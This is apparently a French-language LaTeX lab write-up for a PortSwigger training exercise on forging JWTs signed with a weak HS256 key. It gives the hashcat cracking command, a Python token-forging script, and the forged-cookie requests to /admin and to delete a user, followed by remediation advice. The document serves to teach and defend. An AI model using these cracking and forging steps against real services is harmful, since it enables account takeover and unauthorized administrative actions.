@@ -1,0 +1,211 @@
+% =====================================================================
+%  Rapport de sécurité - JWT authentication bypass via weak signing key
+%  Compilation : latexmk -pdf jwt-weak-signing-key.tex
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+\input{../../templates/preambule.tex}
+
+\begin{document}
+
+\makecover
+  {JWT authentication bypass via weak signing key}
+  {CWE-326 \textperiodcentered{} OWASP A02\string:2021}
+  {
+    \metarow{Lab}{JWT authentication bypass via weak signing key}
+    \metarow{Classe}{Authentification (JWT)}
+    \metarow{Difficulté}{Practitioner}
+    \metarow{Cible}{Mécanisme de session JWT (HS256)}
+    \metarow{Plateforme}{PortSwigger Web Security Academy}
+  }
+  {Lucas Fagioli}
+  {15 septembre 2026}
+
+% =====================================================================
+\section{Contexte}
+% =====================================================================
+L'application gère les sessions avec un \textbf{JSON Web Token} (JWT) signé en
+\texttt{HS256}, un algorithme symétrique : la même clé secrète sert à signer le
+jeton et à vérifier sa signature. Toute la sécurité repose donc sur le fait que
+cette clé reste inconnue de l'attaquant.
+
+Ici la clé de signature est \textbf{faible} : c'est un secret court et
+prévisible, présent dans des listes publiques. Un attaquant peut le retrouver
+hors ligne à partir d'un seul jeton, puis \textbf{forger n'importe quel jeton
+valide}, dont un jeton administrateur, et accéder à l'interface
+d'administration réservée.
+
+\begin{itemize}
+  \item \textbf{Point faible} : le secret HMAC utilisé pour signer les JWT est brute-forçable.
+  \item \textbf{Objectif} : forger un jeton avec \texttt{sub = administrator}, atteindre \texttt{/admin} et supprimer l'utilisateur \texttt{carlos}.
+\end{itemize}
+
+\subsection{Environnement}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
+  \textbf{Système}        & Kali Linux \\
+  \textbf{Proxy}          & Burp Suite Community Edition (Repeater) \\
+  \textbf{Cassage}        & \texttt{hashcat} (mode 16500, JWT) \\
+  \textbf{Wordlist}       & \texttt{jwt.secrets.list} (dépôt \texttt{wallarm/jwt-secrets}) \\
+  \textbf{Forge}          & script Python (bibliothèque standard : \texttt{hmac}, \texttt{hashlib}) \\
+  \textbf{Cible}          & Instance de lab PortSwigger, \texttt{*.web-security-academy.net} \\
+\end{tabular}
+
+\shot{01-lab-not-solved.png}{État initial du lab, non résolu.}
+
+% =====================================================================
+\section{Reconnaissance}
+% =====================================================================
+Le lab fournit un compte de test. On se connecte via \emph{My account} avec les
+identifiants \texttt{wiener:peter}.
+
+\shot{02-login-wiener.png}{Connexion avec le compte fourni \texttt{wiener}.}
+
+Une fois connecté, le serveur pose un cookie de session. Dans l'historique du
+proxy Burp, la requête vers \texttt{/my-account} porte un cookie
+\texttt{session} dont la valeur est un JWT : trois parties séparées par des
+points (\texttt{en-tête.charge.signature}).
+
+\shot{03-session-jwt-in-burp.png}{Cookie \texttt{session} (le JWT) dans la requête interceptée par Burp.}
+
+L'interface d'administration est, elle, hors de portée : y accéder en tant que
+\texttt{wiener} renvoie un message indiquant qu'elle est réservée aux
+administrateurs.
+
+\shot{04-admin-denied-as-wiener.png}{Accès à \texttt{/admin} refusé pour \texttt{wiener}.}
+
+On décode le JWT (par exemple sur \texttt{jwt.io}, ou en base64url) pour
+comprendre ce qu'il faudra reproduire. L'en-tête révèle l'algorithme, la charge
+contient l'identité :
+
+\begin{lstlisting}
+En-tete : {"kid":"e8b4ea30-...","alg":"HS256"}
+Charge  : {"iss":"portswigger","exp":1789472166,"sub":"wiener"}
+\end{lstlisting}
+
+\shot{05-jwt-decoded-hs256.png}{JWT décodé : algorithme \texttt{HS256} et \texttt{sub = wiener}.}
+
+Deux enseignements : la signature est \textbf{symétrique} (\texttt{HS256}, donc
+cassable si le secret est faible), et l'identité de l'utilisateur tient dans la
+claim \texttt{sub}. Il suffira de la passer à \texttt{administrator}, à
+condition de savoir re-signer le jeton.
+
+% =====================================================================
+\section{Exploitation}
+% =====================================================================
+
+\subsection{Casser le secret de signature hors ligne}
+La signature \texttt{HS256} est un HMAC-SHA256 du couple
+\texttt{en-tête.charge}. On la soumet à \texttt{hashcat} en mode 16500 (JWT)
+contre une liste de secrets faibles connus :
+
+\begin{lstlisting}[language=bash]
+wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
+echo '<le JWT complet>' > jwt.txt
+hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
+\end{lstlisting}
+
+Le secret tombe instantanément : il figure dans la wordlist. hashcat affiche le
+jeton suivi de sa clé, \texttt{...:secret1}, avec le statut \texttt{Cracked}.
+
+\shot{06-hashcat-secret-cracked.png}{\texttt{hashcat} retrouve le secret \texttt{secret1} (statut \texttt{Cracked}).}
+
+\begin{keybox}
+\textbf{Idée clé.}\quad Avec le secret HMAC en main, on ne \emph{contourne} pas
+la vérification de signature : on produit une signature \textbf{authentique}.
+Le serveur validera n'importe quel jeton qu'on lui présente, pourvu qu'il soit
+signé avec \texttt{secret1}.
+\end{keybox}
+
+\subsection{Forger un jeton administrateur}
+Pas besoin d'outil dédié : un JWT \texttt{HS256} se fabrique avec la seule
+bibliothèque standard de Python. On repart de l'en-tête d'origine (on conserve
+le \texttt{kid}), on met \texttt{sub = administrator}, puis on re-signe avec le
+secret cassé.
+
+\begin{lstlisting}[language=Python]
+import base64, hmac, hashlib, json
+def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=')
+
+secret  = b'secret1'
+header  = {"kid":"e8b4ea30-...","alg":"HS256"}
+payload = {"iss":"portswigger","exp":2000000000,"sub":"administrator"}
+
+h = b64(json.dumps(header,  separators=(',',':')).encode())
+p = b64(json.dumps(payload, separators=(',',':')).encode())
+sig = b64(hmac.new(secret, h + b'.' + p, hashlib.sha256).digest())
+print((h + b'.' + p + b'.' + sig).decode())
+\end{lstlisting}
+
+Le script imprime un jeton complet et valide, dont la charge contient bien
+\texttt{sub = administrator}.
+
+\shot{07-forged-admin-token.png}{Jeton administrateur forgé et re-signé avec \texttt{secret1}.}
+
+\begin{warnbox}
+\textbf{Attention à l'expiration.}\quad La claim \texttt{exp} du jeton d'origine
+est de courte durée. En la recopiant telle quelle, le serveur répond
+\texttt{302} vers \texttt{/login} (jeton expiré). Comme on contrôle désormais
+\emph{toutes} les claims, on fixe un \texttt{exp} lointain pour disposer d'un
+jeton durablement valide.
+\end{warnbox}
+
+\subsection{Accéder à l'interface d'administration}
+Dans le Repeater, on rejoue la requête en la pointant sur \texttt{/admin} et en
+remplaçant le cookie \texttt{session} par le jeton forgé :
+
+\begin{lstlisting}
+GET /admin HTTP/2
+Cookie: session=<jeton administrateur forgé>
+\end{lstlisting}
+
+La réponse passe de l'erreur d'accès à un \texttt{200} contenant le HTML du
+panneau d'administration, avec les liens de suppression d'utilisateurs.
+
+\shot{08-admin-panel-access.png}{Panneau d'administration atteint avec le jeton forgé.}
+
+% =====================================================================
+\section{Impact}
+% =====================================================================
+Un secret de signature faible réduit à néant la garantie d'authenticité du JWT.
+En le retrouvant, on usurpe l'identité de n'importe quel utilisateur et on
+escalade jusqu'au rôle administrateur, sans mot de passe ni interaction de la
+victime. Ici, cela mène à un accès complet à l'interface d'administration et à
+la suppression d'un compte :
+
+\begin{lstlisting}
+GET /admin/delete?username=carlos HTTP/2
+Cookie: session=<jeton administrateur forgé>
+\end{lstlisting}
+
+\shot{09-delete-carlos.png}{Suppression de \texttt{carlos} avec le jeton forgé.}
+
+Le lab est alors marqué comme résolu.
+
+\shot{10-lab-solved.png}{Lab résolu.}
+
+Dans le monde réel, la même faiblesse permet le détournement de compte à grande
+échelle et le contournement de tout contrôle d'accès reposant sur le JWT, tant
+que le secret n'est pas changé. L'attaque ne demande aucun privilège et se
+reproduit trivialement une fois le secret connu.
+
+Gravité indicative : \textbf{élevée}.
+
+% =====================================================================
+\section{Remédiation}
+% =====================================================================
+La cause racine est un secret HMAC à faible entropie, devinable par dictionnaire.
+
+\begin{itemize}
+  \item \textbf{Correctif principal} : utiliser un secret \textbf{long et aléatoire} (haute entropie, généré par un CSPRNG), jamais un mot de dictionnaire ni une valeur par défaut.
+  \item \textbf{Gestion des clés} : conserver le secret dans un gestionnaire de secrets, et prévoir sa \textbf{rotation} ; en cas de fuite, révoquer et changer la clé.
+  \item \textbf{Signature asymétrique} : préférer un algorithme asymétrique (\texttt{RS256}, \texttt{ES256}) ; le serveur ne détient alors que la clé publique de vérification, et la clé privée de signature n'a pas à être partagée.
+  \item \textbf{Imposer l'algorithme} : fixer côté serveur l'algorithme attendu et rejeter \texttt{none} comme tout algorithme différent, pour éviter les attaques de substitution.
+  \item \textbf{Durée de vie courte} : garder des \texttt{exp} brefs et associer un mécanisme de révocation, pour limiter la fenêtre d'un jeton compromis.
+\end{itemize}
+
+\vspace{4pt}
+\noindent\emph{Références} : OWASP JSON Web Token Cheat Sheet ; PortSwigger Web
+Security Academy, \emph{JWT attacks} ; CWE-326 (Inadequate Encryption
+Strength).
+
+\end{document}
